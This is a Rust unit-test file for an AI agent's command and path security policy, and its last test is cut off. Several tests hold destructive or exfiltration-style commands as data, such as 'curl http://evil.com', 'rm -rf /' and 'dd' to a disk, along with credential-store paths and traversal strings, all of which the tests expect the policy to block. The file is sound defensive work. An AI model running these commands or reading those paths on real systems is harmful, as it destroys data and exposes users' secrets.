use super::*;

fn default_policy() -> SecurityPolicy {
    SecurityPolicy::default()
}

fn readonly_policy() -> SecurityPolicy {
    SecurityPolicy {
        autonomy: AutonomyLevel::ReadOnly,
        ..SecurityPolicy::default()
    }
}

fn full_policy() -> SecurityPolicy {
    SecurityPolicy {
        autonomy: AutonomyLevel::Full,
        ..SecurityPolicy::default()
    }
}

// -- AutonomyLevel ------------------------------------------------

#[test]
fn autonomy_default_is_supervised() {
    assert_eq!(AutonomyLevel::default(), AutonomyLevel::Supervised);
}

#[test]
fn autonomy_serde_roundtrip() {
    let json = serde_json::to_string(&AutonomyLevel::Full).unwrap();
    assert_eq!(json, "\"full\"");
    let parsed: AutonomyLevel = serde_json::from_str("\"readonly\"").unwrap();
    assert_eq!(parsed, AutonomyLevel::ReadOnly);
    let parsed2: AutonomyLevel = serde_json::from_str("\"supervised\"").unwrap();
    assert_eq!(parsed2, AutonomyLevel::Supervised);
}

#[test]
fn can_act_readonly_false() {
    assert!(!readonly_policy().can_act());
}

#[test]
fn can_act_supervised_true() {
    assert!(default_policy().can_act());
}

#[test]
fn can_act_full_true() {
    assert!(full_policy().can_act());
}

#[test]
fn enforce_tool_operation_read_allowed_in_readonly_mode() {
    let p = readonly_policy();
    assert!(p
        .enforce_tool_operation(ToolOperation::Read, "memory_recall")
        .is_ok());
}

#[test]
fn enforce_tool_operation_act_blocked_in_readonly_mode() {
    let p = readonly_policy();
    let err = p
        .enforce_tool_operation(ToolOperation::Act, "memory_store")
        .unwrap_err();
    assert!(err.contains("read-only mode"));
}

#[test]
fn enforce_tool_operation_act_uses_rate_budget() {
    let p = SecurityPolicy {
        max_actions_per_hour: 0,
        ..default_policy()
    };
    let err = p
        .enforce_tool_operation(ToolOperation::Act, "memory_store")
        .unwrap_err();
    assert!(err.contains("Rate limit exceeded"));
}

#[test]
fn action_budget_error_mentions_limit_and_settings() {
    let p = SecurityPolicy {
        max_actions_per_hour: 0,
        ..default_policy()
    };

    let err = p
        .enforce_tool_operation(ToolOperation::Act, "write_file")
        .unwrap_err();

    assert!(err.contains("Rate limit exceeded: action budget exhausted"));
    assert!(err.contains("0 actions/hour"));
    assert!(err.contains("Settings -> Advanced -> Agent autonomy"));
}

// -- is_command_allowed -------------------------------------------

#[test]
fn default_policy_allowed_commands_expanded() {
    // Issue #2486: verify all newly added safe commands are present in the
    // default allowlist so agents can use them without manual configuration.
    let p = default_policy();

    // Build tools
    for cmd in ["make", "cmake", "pnpm", "yarn"] {
        assert!(
            p.is_command_allowed(cmd),
            "default policy should allow build tool: {cmd}"
        );
    }

    // Read-only inspection tools (low-risk)
    for cmd in [
        "sort file.txt",
        "uniq file.txt",
        "diff a.txt b.txt",
        "which git",
        "uname -a",
        "basename /foo/bar.rs",
        "dirname /foo/bar.rs",
        "tr 'a' 'b'",
        "cut -d: -f1 /dev/stdin",
        "realpath .",
        "readlink file",
        "stat file.txt",
        "file README.md",
    ] {
        assert!(
            p.is_command_allowed(cmd),
            "default policy should allow read-only tool: {cmd}"
        );
    }

    // Filesystem mutation tools (medium-risk — allowed on allowlist,
    // but require approval in Supervised mode)
    for cmd in [
        "mkdir src/new",
        "touch Makefile",
        "cp src/a.rs src/b.rs",
        "mv old.txt new.txt",
        "ln -s src/a.rs link.rs",
    ] {
        assert!(
            p.is_command_allowed(cmd),
            "default policy should allow medium-risk tool: {cmd}"
        );
        // Confirm they are actually medium-risk so the approval gate applies
        assert_eq!(
            p.command_risk_level(cmd),
            CommandRiskLevel::Medium,
            "{cmd} should be classified as medium-risk"
        );
    }
}

#[test]
fn allowed_commands_basic() {
    let p = default_policy();
    assert!(p.is_command_allowed("ls"));
    assert!(p.is_command_allowed("git status"));
    assert!(p.is_command_allowed("cargo build --release"));
    assert!(p.is_command_allowed("cat file.txt"));
    assert!(p.is_command_allowed("grep -r pattern ."));
    assert!(p.is_command_allowed("date"));
}

#[test]
fn allowed_commands_include_windows_read_equivalents() {
    let p = default_policy();
    for command in [
        "dir",
        "type README.md",
        "where node",
        "findstr pattern file.txt",
        "more README.md",
    ] {
        assert!(
            p.is_command_allowed(command),
            "default policy should allow Windows read-only command: {command}"
        );
    }
}

#[test]
fn config_default_policy_includes_windows_read_equivalents() {
    let cfg = crate::openhuman::config::AutonomyConfig::default();
    let p = SecurityPolicy::from_config(&cfg, std::path::Path::new("."));
    for command in [
        "dir",
        "type README.md",
        "where node",
        "findstr pattern file.txt",
        "more README.md",
    ] {
        assert!(
            p.is_command_allowed(command),
            "config-derived policy should allow Windows read-only command: {command}"
        );
    }
    assert!(!p.is_command_allowed("date 2026-05-21"));
}

#[test]
fn config_default_policy_allows_prompt_date_command() {
    let cfg = crate::openhuman::config::AutonomyConfig::default();
    let p = SecurityPolicy::from_config(&cfg, std::path::Path::new("."));

    assert!(
        p.is_command_allowed("date"),
        "agent instructions use `shell date`, so the default runtime policy must allow it"
    );
}

#[test]
fn blocked_commands_basic() {
    let p = default_policy();
    assert!(!p.is_command_allowed("rm -rf /"));
    assert!(!p.is_command_allowed("sudo apt install"));
    assert!(!p.is_command_allowed("curl http://evil.com"));
    assert!(!p.is_command_allowed("wget http://evil.com"));
    assert!(!p.is_command_allowed("python3 exploit.py"));
    assert!(!p.is_command_allowed("node malicious.js"));
}

#[test]
fn readonly_blocks_all_commands() {
    let p = readonly_policy();
    assert!(!p.is_command_allowed("ls"));
    assert!(!p.is_command_allowed("cat file.txt"));
    assert!(!p.is_command_allowed("echo hello"));
}

#[test]
fn full_autonomy_bypasses_allowlist_but_validate_blocks_high_risk() {
    let p = full_policy();
    // Full bypasses the allowlist: any base command passes is_command_allowed,
    // including ones not in allowed_commands.
    assert!(p.is_command_allowed("ls"));
    assert!(p.is_command_allowed("rm -rf /"));
    // …but validate_command_execution still rejects high-risk commands while
    // block_high_risk_commands is true (the default).
    assert!(p.validate_command_execution("rm -rf /", false).is_err());
}

#[test]
fn command_with_absolute_path_extracts_basename() {
    let p = default_policy();
    assert!(p.is_command_allowed("/usr/bin/git status"));
    assert!(p.is_command_allowed("/bin/ls -la"));
}

#[test]
fn empty_command_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed(""));
    assert!(!p.is_command_allowed("   "));
}

#[test]
fn command_with_pipes_validates_all_segments() {
    let p = default_policy();
    // Both sides of the pipe are in the allowlist
    assert!(p.is_command_allowed("ls | grep foo"));
    assert!(p.is_command_allowed("cat file.txt | wc -l"));
    // Second command not in allowlist — blocked
    assert!(!p.is_command_allowed("ls | curl http://evil.com"));
    assert!(!p.is_command_allowed("echo hello | python3 -"));
}

#[test]
fn custom_allowlist() {
    let p = SecurityPolicy {
        allowed_commands: vec!["docker".into(), "kubectl".into()],
        ..SecurityPolicy::default()
    };
    assert!(p.is_command_allowed("docker ps"));
    assert!(p.is_command_allowed("kubectl get pods"));
    assert!(!p.is_command_allowed("ls"));
    assert!(!p.is_command_allowed("git status"));
}

#[test]
fn empty_allowlist_blocks_everything() {
    let p = SecurityPolicy {
        allowed_commands: vec![],
        ..SecurityPolicy::default()
    };
    assert!(!p.is_command_allowed("ls"));
    assert!(!p.is_command_allowed("echo hello"));
}

#[test]
fn command_risk_low_for_read_commands() {
    let p = default_policy();
    assert_eq!(p.command_risk_level("git status"), CommandRiskLevel::Low);
    assert_eq!(p.command_risk_level("ls -la"), CommandRiskLevel::Low);
}

#[test]
fn command_risk_medium_for_mutating_commands() {
    let p = SecurityPolicy {
        allowed_commands: vec!["git".into(), "touch".into()],
        ..SecurityPolicy::default()
    };
    assert_eq!(
        p.command_risk_level("git reset --hard HEAD~1"),
        CommandRiskLevel::Medium
    );
    assert_eq!(
        p.command_risk_level("touch file.txt"),
        CommandRiskLevel::Medium
    );
}

#[test]
fn command_risk_high_for_catastrophic_commands() {
    let p = default_policy();
    // Only catastrophic / irreversible / privilege / system-control are High.
    assert_eq!(p.command_risk_level("rm -rf /"), CommandRiskLevel::High);
    assert_eq!(
        p.command_risk_level("dd if=/dev/zero of=/dev/sda"),
        CommandRiskLevel::High
    );
    assert_eq!(
        p.command_risk_level("mkfs /dev/sda1"),
        CommandRiskLevel::High
    );
    assert_eq!(
        p.command_risk_level("shutdown -h now"),
        CommandRiskLevel::High
    );
    assert_eq!(p.command_risk_level("sudo rm file"), CommandRiskLevel::High);
    // An ordinary recursive delete of a relative path is NO LONGER high-risk
    // (only the `rm -rf /…` absolute pattern is) — it's medium now.
    assert_eq!(
        p.command_risk_level("rm -rf build"),
        CommandRiskLevel::Medium
    );
}

// -- classify_command / gate_decision (fail-closed bucket model) --

#[test]
fn classify_reads_are_read() {
    let p = default_policy();
    for c in [
        "ls -la",
        "cat f",
        "grep x f",
        "git status",
        "git log --oneline",
        "pwd",
        "wc -l f",
        "head f",
        "find . -name '*.rs'",
        "cargo tree",
        "npm ls",
        "dir",
        "type f.txt",
        "Get-Content f",
    ] {
        assert_eq!(p.classify_command(c), CommandClass::Read, "{c}");
    }
}

#[test]
fn classify_unknown_is_write_fail_closed() {
    let p = default_policy();
    // The whole point: a command we don't recognize is NOT treated as read.
    assert_eq!(p.classify_command("./deploy.sh"), CommandClass::Write);
    assert_eq!(
        p.classify_command("some-random-binary --go"),
        CommandClass::Write
    );
    assert_eq!(p.classify_command("git"), CommandClass::Write); // bare git
}

#[test]
fn classify_writes_are_write() {
    let p = default_policy();
    for c in [
        "touch f",
        "mkdir d",
        "mv a b",
        "rm -rf build",
        "git commit -m x",
        "git push",
        "npm install",
        "cargo build",
        "node script.js",
        "python3 x.py",
        "bash -lc 'id'",
        "Remove-Item x",
    ] {
        assert_eq!(p.classify_command(c), CommandClass::Write, "{c}");
    }
}

#[test]
fn classify_network_is_network() {
    let p = default_policy();
    for c in [
        "curl http://x",
        "wget http://x",
        "ssh host",
        "scp a b",
        "nc -l 1",
        "Invoke-WebRequest http://x",
    ] {
        assert_eq!(p.classify_command(c), CommandClass::Network, "{c}");
    }
}

#[test]
fn classify_destructive_is_destructive() {
    let p = default_policy();
    for c in [
        "sudo rm f",
        "dd if=/dev/zero of=/dev/sda",
        "mkfs /dev/sda1",
        "shutdown -h now",
        "rm -rf /",
        "format C:",
        "diskpart",
    ] {
        assert_eq!(p.classify_command(c), CommandClass::Destructive, "{c}");
    }
}

#[test]
fn classify_highest_segment_wins() {
    let p = default_policy();
    assert_eq!(
        p.classify_command("ls | curl http://x"),
        CommandClass::Network
    );
    assert_eq!(
        p.classify_command("cat f && sudo reboot"),
        CommandClass::Destructive
    );
    assert_eq!(p.classify_command("ls && mkdir d"), CommandClass::Write);
}

#[test]
fn classify_redirect_lifts_read_to_write() {
    let p = default_policy();
    // `cat` is read, but the redirect writes a file.
    assert_eq!(p.classify_command("cat f"), CommandClass::Read);
    assert_eq!(p.classify_command("cat f > out.txt"), CommandClass::Write);
    assert_eq!(
        p.classify_command("echo hi | tee out.txt"),
        CommandClass::Write
    );
}

#[test]
fn gate_decision_readonly_blocks_acts() {
    let p = readonly_policy();
    assert_eq!(p.gate_decision(CommandClass::Read), GateDecision::Allow);
    assert_eq!(p.gate_decision(CommandClass::Write), GateDecision::Block);
    assert_eq!(p.gate_decision(CommandClass::Network), GateDecision::Block);
    assert_eq!(
        p.gate_decision(CommandClass::Destructive),
        GateDecision::Block
    );
}

#[test]
fn gate_decision_supervised_prompts_every_act() {
    let p = default_policy(); // Supervised
    assert_eq!(p.gate_decision(CommandClass::Read), GateDecision::Allow);
    assert_eq!(p.gate_decision(CommandClass::Write), GateDecision::Prompt);
    assert_eq!(p.gate_decision(CommandClass::Network), GateDecision::Prompt);
    assert_eq!(
        p.gate_decision(CommandClass::Destructive),
        GateDecision::Prompt
    );
}

#[test]
fn gate_decision_full_runs_write_but_prompts_network_and_destructive() {
    let p = full_policy();
    assert_eq!(p.gate_decision(CommandClass::Read), GateDecision::Allow);
    assert_eq!(p.gate_decision(CommandClass::Write), GateDecision::Allow);
    assert_eq!(p.gate_decision(CommandClass::Network), GateDecision::Prompt);
    assert_eq!(
        p.gate_decision(CommandClass::Destructive),
        GateDecision::Prompt
    );
}

// -- install chokepoint (Phase C) ---------------------------------

#[test]
fn classify_installs_are_install_bucket() {
    let p = default_policy();
    for c in [
        "apt install jq",
        "apt-get install -y curl",
        "brew install ripgrep",
        "pacman -S vim",
        "pacman -Sy",
        "pacman -Syu",
        "apk add bash",
        "dnf install nginx",
        "pip install requests",
        "pip3 install x",
        "pipx install black",
        "gem install rails",
        "cargo install ripgrep",
        "go install ./cmd/x",
        "npm install -g typescript",
        "pnpm add -g eslint",
        "yarn global add prettier",
    ] {
        assert_eq!(p.classify_command(c), CommandClass::Install, "{c}");
    }
}

#[test]
fn classify_local_installs_are_write_not_install() {
    let p = default_policy();
    // Project-local installs are ordinary writes (run in Full), not the
    // host-modifying Install bucket.
    assert_eq!(p.classify_command("npm install"), CommandClass::Write);
    assert_eq!(
        p.classify_command("npm install lodash"),
        CommandClass::Write
    );
    assert_eq!(p.classify_command("cargo add serde"), CommandClass::Write);
}

#[test]
fn classify_pacman_readonly_queries_are_not_install() {
    let p = default_policy();
    // pacman's `-S` family includes read-only queries (search/info/list/groups/
    // print). A blanket `starts_with("-s")` mis-bucketed these as always-ask
    // Install; they must fall through to the fail-closed Write default instead.
    for c in [
        "pacman -Ss firefox", // search
        "pacman -Si vim",     // info
        "pacman -Sl core",    // list a repo
        "pacman -Sg",         // list groups
        "pacman -Sp vim",     // print download URLs
    ] {
        assert_eq!(p.classify_command(c), CommandClass::Write, "{c}");
    }
}

#[test]
fn gate_decision_install_always_asks_even_in_full() {
    assert_eq!(
        full_policy().gate_decision(CommandClass::Install),
        GateDecision::Prompt
    );
    assert_eq!(
        default_policy().gate_decision(CommandClass::Install),
        GateDecision::Prompt
    );
    assert_eq!(
        readonly_policy().gate_decision(CommandClass::Install),
        GateDecision::Block
    );
}

// -- cross-platform always-forbidden hardening (Phase E) ----------

#[test]
fn always_forbidden_blocks_credential_stores_case_insensitively() {
    use std::path::Path;
    for p in [
        "/home/u/.ssh/id_rsa",
        "/home/u/.SSH/id_rsa", // case-insensitive
        "C:\\Users\\u\\.ssh\\id_rsa",
        "/home/u/.gnupg/x",
        "/home/u/.aws/credentials",
        "/home/u/.azure/x",
        "/home/u/.kube/config",
        "/Users/u/Library/Keychains/login.keychain",
        "C:\\Users\\u\\AppData\\Roaming\\Microsoft\\Protect\\x",
        "C:\\Users\\u\\AppData\\Local\\Microsoft\\Credentials\\x",
    ] {
        assert!(SecurityPolicy::is_always_forbidden(Path::new(p)), "{p}");
    }
}

#[test]
fn always_forbidden_blocks_core_os_dirs_cross_platform() {
    use std::path::Path;
    for p in [
        "/etc/passwd",
        "/root/.bashrc",
        "/boot/x",
        "/proc/1",
        "/sys/x",
        "/System/Library/x",
        "C:\\Windows\\System32\\config",
        "C:\\WINDOWS\\x", // case-insensitive
        "C:\\Program Files\\App\\x",
        "C:\\ProgramData\\secret",
    ] {
        assert!(SecurityPolicy::is_always_forbidden(Path::new(p)), "{p}");
    }
}

#[test]
fn always_forbidden_leaves_gray_area_dirs_to_overridable_forbidden_paths() {
    use std::path::Path;
    // NOT unconditional — a trusted_root grant may reach these (e.g.
    // /usr/local, /opt, ~/Library, project dirs).
    for p in [
        "/usr/local/bin/tool",
        "/opt/app/x",
        "/var/data/x",
        "/Users/u/Library/Application Support/x",
        "/home/u/projects/myrepo/src/main.rs",
        "C:\\Users\\u\\projects\\app\\src",
    ] {
        assert!(!SecurityPolicy::is_always_forbidden(Path::new(p)), "{p}");
    }
}

// -- LLM escalate-only category (Phase G) -------------------------

#[test]
fn parse_declared_class_maps_known_and_rejects_unknown() {
    assert_eq!(
        SecurityPolicy::parse_declared_class("destructive"),
        Some(CommandClass::Destructive)
    );
    assert_eq!(
        SecurityPolicy::parse_declared_class("  WRITE "),
        Some(CommandClass::Write)
    );
    assert_eq!(
        SecurityPolicy::parse_declared_class("network"),
        Some(CommandClass::Network)
    );
    assert_eq!(
        SecurityPolicy::parse_declared_class("install"),
        Some(CommandClass::Install)
    );
    assert_eq!(SecurityPolicy::parse_declared_class("bogus"), None);
    assert_eq!(SecurityPolicy::parse_declared_class(""), None);
    // Escalate-only contract: max() raises but never lowers.
    assert_eq!(
        CommandClass::Write.max(CommandClass::Destructive),
        CommandClass::Destructive
    );
    assert_eq!(
        CommandClass::Destructive.max(CommandClass::Read),
        CommandClass::Destructive
    );
}

#[test]
fn command_risk_medium_for_command_executors() {
    // Interpreters / code executors are medium-risk now (not high): a coding
    // agent must be able to run them — prompted in Supervised, allowed in Full.
    let p = default_policy();
    for command in [
        "xargs rm",
        "awk 'BEGIN{system(\"id\")}'",
        "perl -e 'system \"id\"'",
        "python3 -c 'import os; os.system(\"id\")'",
        "pythonw3 -c 'import os; os.system(\"id\")'",
        "ruby -e 'system \"id\"'",
        "bash -lc 'id'",
        "sh -c 'id'",
        "C:\\Python312\\python.EXE -c 'print(1)'",
        "C:\\Python312\\pythonw3.12.exe -c 'print(1)'",
        "/usr/bin/env python3 -c 'print(1)'",
    ] {
        assert_eq!(
            p.command_risk_level(command),
            CommandRiskLevel::Medium,
            "{command} should be medium risk"
        );
    }
}

#[test]
fn validate_command_requires_approval_for_medium_risk() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        require_approval_for_medium_risk: true,
        allowed_commands: vec!["touch".into()],
        ..SecurityPolicy::default()
    };

    let denied = p.validate_command_execution("touch test.txt", false);
    assert!(denied.is_err());
    assert!(denied.unwrap_err().contains("requires explicit approval"),);

    let allowed = p.validate_command_execution("touch test.txt", true);
    assert_eq!(allowed.unwrap(), CommandRiskLevel::Medium);
}

#[test]
fn validate_command_blocks_high_risk_by_default() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        allowed_commands: vec!["rm".into()],
        ..SecurityPolicy::default()
    };

    let result = p.validate_command_execution("rm -rf /tmp/test", true);
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("high-risk"));
}

#[test]
fn validate_command_full_mode_skips_medium_risk_approval_gate() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Full,
        require_approval_for_medium_risk: true,
        allowed_commands: vec!["touch".into()],
        ..SecurityPolicy::default()
    };

    let result = p.validate_command_execution("touch test.txt", false);
    assert_eq!(result.unwrap(), CommandRiskLevel::Medium);
}

#[test]
fn validate_command_rejects_background_chain_bypass() {
    let p = default_policy();
    let result = p.validate_command_execution("ls & python3 -c 'print(1)'", false);
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("not allowed"));
}

// Regression: OPENHUMAN-TAURI-GW (#1813). A multi-byte UTF-8 char straddling
// byte 80 of the command string used to panic the log truncator with
// `byte index 80 is not a char boundary`, killing the core thread. All five
// `&command[..80]` log sites must now round down to a UTF-8 boundary.
#[test]
fn validate_command_does_not_panic_on_multibyte_char_at_log_truncation_boundary() {
    // Real-world Sentry repro: `cmd /c "dir /b "%USERPROFILE%\Desktop\*.lnk"
    // 2>nul | findstr /i "Warcraft WoW 魔兽 Battle"` — the 3-byte `'魔'`
    // occupies bytes 78..81, so a naked `&command[..80]` panics.
    let cmd = "cmd /c \"dir /b \"%USERPROFILE%\\Desktop\\*.lnk\" 2>nul | findstr /i \"Warcraft WoW 魔兽 Battle\"";
    assert!(
        cmd.len() > 80,
        "test fixture must be long enough to trigger truncation"
    );
    assert!(
        !cmd.is_char_boundary(80),
        "test fixture must place a multi-byte char across byte 80"
    );

    // Exercise the allowlist-deny path (cmd starts with "cmd" which is not on
    // the default allowlist), which fires the truncating warn! at policy.rs.
    let p = default_policy();
    let result = p.validate_command_execution(cmd, false);
    assert!(
        result.is_err(),
        "command should be blocked, but did not panic"
    );

    // And the high-risk-blocked path: allowlist passes (dd is allowed), then
    // risk gate fires (dd is a high-risk command), exercising the truncating
    // warn! site at the block_high_risk_commands branch.
    let prefix = "dd if=/dev/zero of=/dev/";
    let filler = "a".repeat(80 - prefix.len() - 1);
    let high_risk_cmd = format!("{prefix}{filler}魔");
    assert!(
        !high_risk_cmd.is_char_boundary(80),
        "fixture must straddle byte 80 with a multi-byte char"
    );
    let high_risk_policy = SecurityPolicy {
        allowed_commands: vec!["dd".into()],
        ..SecurityPolicy::default()
    };
    let blocked = high_risk_policy.validate_command_execution(&high_risk_cmd, true);
    assert!(blocked.is_err());
    assert!(blocked.unwrap_err().contains("high-risk"));
}

// Pathological short multi-byte command — exercises the boundary logic at the
// edge case where `cmd.len() < 80`.
#[test]
fn validate_command_handles_short_multibyte_command() {
    let p = default_policy();
    // 6 bytes (two 3-byte CJK chars) — well under the 80-byte log cap.
    let _ = p.validate_command_execution("魔兽", false);
}

// -- is_path_allowed ----------------------------------------------

#[test]
fn relative_paths_allowed() {
    let p = default_policy();
    assert!(p.is_path_string_allowed("file.txt"));
    assert!(p.is_path_string_allowed("src/main.rs"));
    assert!(p.is_path_string_allowed("deep/nested/dir/file.txt"));
}

#[test]
fn path_traversal_blocked() {
    let p = default_policy();
    assert!(!p.is_path_string_allowed("../etc/passwd"));
    assert!(!p.is_path_string_allowed("../../root/.ssh/id_rsa"));
    assert!(!p.is_path_string_allowed("foo/../../../etc/shadow"));
    assert!(!p.is_path_string_allowed(".."));
}

#[test]
fn absolute_paths_blocked_when_workspace_only() {
    let p = default_policy();
    assert!(!p.is_path_string_allowed("/etc/passwd"));
    assert!(!p.is_path_string_allowed("/root/.ssh/id_rsa"));
    assert!(!p.is_path_string_allowed("/tmp/file.txt"));
}

#[test]
fn absolute_paths_allowed_when_not_workspace_only() {
    let p = SecurityPolicy {
        workspace_only: false,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    assert!(p.is_path_string_allowed("/tmp/file.txt"));
}

#[test]
fn forbidden_paths_blocked() {
    let p = SecurityPolicy {
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    assert!(!p.is_path_string_allowed("/etc/passwd"));
    assert!(!p.is_path_string_allowed("/root/.bashrc"));
    assert!(!p.is_path_string_allowed("~/.ssh/id_rsa"));
    assert!(!p.is_path_string_allowed("~/.gnupg/pubring.kbx"));
}

#[test]
fn empty_path_allowed() {
    let p = default_policy();
    assert!(p.is_path_string_allowed(""));
}

#[test]
fn dotfile_in_workspace_allowed() {
    let workspace = tempfile::tempdir().expect("workspace tempdir");
    std::fs::write(workspace.path().join(".gitignore"), "target/\n").expect("write .gitignore");
    std::fs::write(workspace.path().join(".env"), "LOCAL_ONLY=1\n").expect("write .env");
    let p = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    assert!(p.is_path_string_allowed(".gitignore"));
    assert!(p.is_path_string_allowed(".env"));
}

// -- is_path_allowed — symlink safety (#1927) ---------------------

#[cfg(unix)]
#[test]
fn symlink_inside_workspace_escaping_outside_is_blocked() {
    use std::os::unix::fs::symlink;

    let workspace = tempfile::tempdir().expect("workspace tempdir");
    let outside = tempfile::tempdir().expect("outside tempdir");
    let target = outside.path().join("secret.txt");
    std::fs::write(&target, "secret").expect("write secret");

    let link = workspace.path().join("evil");
    symlink(&target, &link).expect("create symlink");

    let p = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };

    // String-level checks pass: "evil" has no "..", isn't absolute, and is
    // not in forbidden_paths. The canonicalize step must catch the symlink
    // pointing outside the workspace root.
    assert!(
        !p.is_path_string_allowed("evil"),
        "symlink that escapes the workspace must be blocked"
    );
}

#[cfg(unix)]
#[test]
fn symlink_to_forbidden_tree_is_blocked() {
    use std::os::unix::fs::symlink;

    let workspace = tempfile::tempdir().expect("workspace tempdir");
    let forbidden = tempfile::tempdir().expect("forbidden tempdir");
    let target = forbidden.path().join("secret");
    std::fs::write(&target, "x").expect("write secret");

    let link = workspace.path().join("link-to-forbidden");
    symlink(&target, &link).expect("create symlink");

    let p = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        // Disable workspace_only so the assertion isolates the forbidden_paths
        // path (the symlink escapes the workspace, which would also trip
        // workspace_only — but here we want to prove the forbidden_paths
        // check itself canonicalizes).
        workspace_only: false,
        forbidden_paths: vec![forbidden.path().to_string_lossy().to_string()],
        ..SecurityPolicy::default()
    };

    // The string "link-to-forbidden" does not start with the forbidden
    // tempdir path, so the string-level check passes. Canonical resolution
    // must catch that it resolves into the forbidden tree.
    assert!(
        !p.is_path_string_allowed("link-to-forbidden"),
        "symlink that resolves into a forbidden tree must be blocked"
    );
}

#[test]
fn write_to_not_yet_existing_path_in_workspace_still_allowed() {
    // After adding the symlink-safe canonicalize step, writing to a
    // not-yet-existing path inside the workspace must still pass — the
    // parent-dir fallback canonicalizes the parent and confirms it is
    // inside the workspace root.
    let workspace = tempfile::tempdir().expect("workspace tempdir");
    let p = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };

    assert!(p.is_path_string_allowed("new-file.txt"));
    // Whole parent chain missing too — helper returns None, and we fall
    // back to the string-level checks (which would pass for a
    // workspace-relative non-traversal path).
    assert!(p.is_path_string_allowed("not-yet-existing/subdir/file.txt"));
}

// -- auto_approve defaults ----------------------------------------

#[test]
fn config_default_auto_approve_includes_expanded_tools() {
    // Issue #2486: verify read-only tools are auto-approved by default,
    // and write tools are NOT (Supervised mode must prompt for edits).
    let cfg = crate::openhuman::config::AutonomyConfig::default();

    // Pre-existing auto-approved tools must still be present
    for tool in [
        "file_read",
        "memory_search",
        "memory_list",
        "get_time",
        "list_dir",
    ] {
        assert!(
            cfg.auto_approve.iter().any(|t| t == tool),
            "default auto_approve must still include pre-existing tool: {tool}"
        );
    }

    // Newly added read-only workspace-scoped tools
    for tool in ["glob", "grep"] {
        assert!(
            cfg.auto_approve.iter().any(|t| t == tool),
            "default auto_approve must include newly added tool: {tool}"
        );
    }

    // Write tools must NOT be auto-approved (v4→v5 migration strips these)
    for tool in ["file_write", "edit_file"] {
        assert!(
            !cfg.auto_approve.iter().any(|t| t == tool),
            "write tool {tool} must NOT be auto-approved by default"
        );
    }
}

// -- from_config --------------------------------------------------

#[test]
fn from_config_maps_all_fields() {
    let autonomy_config = crate::openhuman::config::AutonomyConfig {
        level: AutonomyLevel::Full,
        workspace_only: false,
        allowed_commands: vec!["docker".into()],
        forbidden_paths: vec!["/secret".into()],
        max_actions_per_hour: 100,
        max_cost_per_day_cents: 1000,
        require_approval_for_medium_risk: false,
        block_high_risk_commands: false,
        auto_approve: vec!["shell".into(), "file_write".into()],
        ..crate::openhuman::config::AutonomyConfig::default()
    };
    let workspace = PathBuf::from("/tmp/test-workspace");
    let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);

    assert_eq!(policy.autonomy, AutonomyLevel::Full);
    assert!(!policy.workspace_only);
    assert_eq!(policy.allowed_commands, vec!["docker"]);
    assert_eq!(policy.forbidden_paths, vec!["/secret"]);
    assert_eq!(policy.max_actions_per_hour, 100);
    assert_eq!(policy.max_cost_per_day_cents, 1000);
    assert!(!policy.require_approval_for_medium_risk);
    assert!(!policy.block_high_risk_commands);
    assert_eq!(policy.workspace_dir, PathBuf::from("/tmp/test-workspace"));
    // The "Always allow" allowlist is carried onto the policy so the gate can
    // skip prompting for these tools.
    assert_eq!(policy.auto_approve, vec!["shell", "file_write"]);
}

// -- Default policy -----------------------------------------------

#[test]
fn default_policy_has_sane_values() {
    let p = SecurityPolicy::default();
    assert_eq!(p.autonomy, AutonomyLevel::Supervised);
    assert!(p.workspace_only);
    assert!(!p.allowed_commands.is_empty());
    assert!(!p.forbidden_paths.is_empty());
    assert!(p.max_actions_per_hour > 0);
    assert!(p.max_cost_per_day_cents > 0);
    assert!(p.require_approval_for_medium_risk);
    assert!(p.block_high_risk_commands);
}

// -- ActionTracker / rate limiting --------------------------------

#[test]
fn action_tracker_starts_at_zero() {
    let tracker = ActionTracker::new();
    assert_eq!(tracker.count(), 0);
}

#[test]
fn action_tracker_records_actions() {
    let tracker = ActionTracker::new();
    assert_eq!(tracker.record(), 1);
    assert_eq!(tracker.record(), 2);
    assert_eq!(tracker.record(), 3);
    assert_eq!(tracker.count(), 3);
}

#[test]
fn record_action_allows_within_limit() {
    let p = SecurityPolicy {
        max_actions_per_hour: 5,
        ..SecurityPolicy::default()
    };
    for _ in 0..5 {
        assert!(p.record_action(), "should allow actions within limit");
    }
}

#[test]
fn record_action_blocks_over_limit() {
    let p = SecurityPolicy {
        max_actions_per_hour: 3,
        ..SecurityPolicy::default()
    };
    assert!(p.record_action()); // 1
    assert!(p.record_action()); // 2
    assert!(p.record_action()); // 3
    assert!(!p.record_action()); // 4 — over limit
}

#[test]
fn is_rate_limited_reflects_count() {
    let p = SecurityPolicy {
        max_actions_per_hour: 2,
        ..SecurityPolicy::default()
    };
    assert!(!p.is_rate_limited());
    p.record_action();
    assert!(!p.is_rate_limited());
    p.record_action();
    assert!(p.is_rate_limited());
}

#[test]
fn action_tracker_clone_is_independent() {
    let tracker = ActionTracker::new();
    tracker.record();
    tracker.record();
    let cloned = tracker.clone();
    assert_eq!(cloned.count(), 2);
    tracker.record();
    assert_eq!(tracker.count(), 3);
    assert_eq!(cloned.count(), 2); // clone is independent
}

// -- Edge cases: command injection --------------------------------

#[test]
fn command_injection_semicolon_blocked() {
    let p = default_policy();
    // First word is "ls;" (with semicolon) — doesn't match "ls" in allowlist.
    // This is a safe default: chained commands are blocked.
    assert!(!p.is_command_allowed("ls; rm -rf /"));
}

#[test]
fn command_injection_semicolon_no_space() {
    let p = default_policy();
    assert!(!p.is_command_allowed("ls;rm -rf /"));
}

#[test]
fn quoted_semicolons_do_not_split_sqlite_command() {
    let p = SecurityPolicy {
